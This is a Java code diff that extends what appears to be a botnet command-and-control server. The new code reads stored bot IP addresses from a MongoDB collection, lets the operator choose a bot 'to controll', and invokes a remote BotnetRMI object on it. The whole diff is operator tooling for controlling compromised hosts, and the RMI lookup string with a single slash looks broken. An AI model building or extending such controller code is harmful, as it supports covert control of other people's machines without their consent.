@@ -5,6 +5,7 @@
  */
 package server;
 
+import DBUtils.MongoConnect;
 import SServer_package.SServer;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
@@ -34,13 +35,19 @@ public class RMIServer {
             SServer sserver = new SServer(2345);
             sserver.start();
             System.out.println(">>>>>INFO: Socket Server started!!!!!!!!");
+            MongoConnect client = new MongoConnect();
+            client.Connect();
+            ArrayList<String> list = client.Read("bot_ip");
             while (true){
+                System.out.println("Available IP:");
+                for (int i = 0; i<list.size(); i++){
+                    System.out.println((i+1) + ": " + list.get(i));
+                }
+                System.out.print("Select IP to controll: ");
                 Scanner scanner = new Scanner(System.in);
-                System.out.println("Bot IP: ");
-                String ip = scanner.nextLine();
-                System.out.println("Port: ");
-                Integer port = scanner.nextInt();
-                IBotnet botnet = (IBotnet) Naming.lookup("rmi://" + ip + ":" + port.toString() + "/BotnetRMI");
+                Integer id = Integer.parseInt(scanner.nextLine());
+                String ip = list.get(id-1);
+                IBotnet botnet = (IBotnet) Naming.lookup("rmi:/" + ip + ":" + "1234" + "/BotnetRMI");
                 botnet.testing();
             }
             
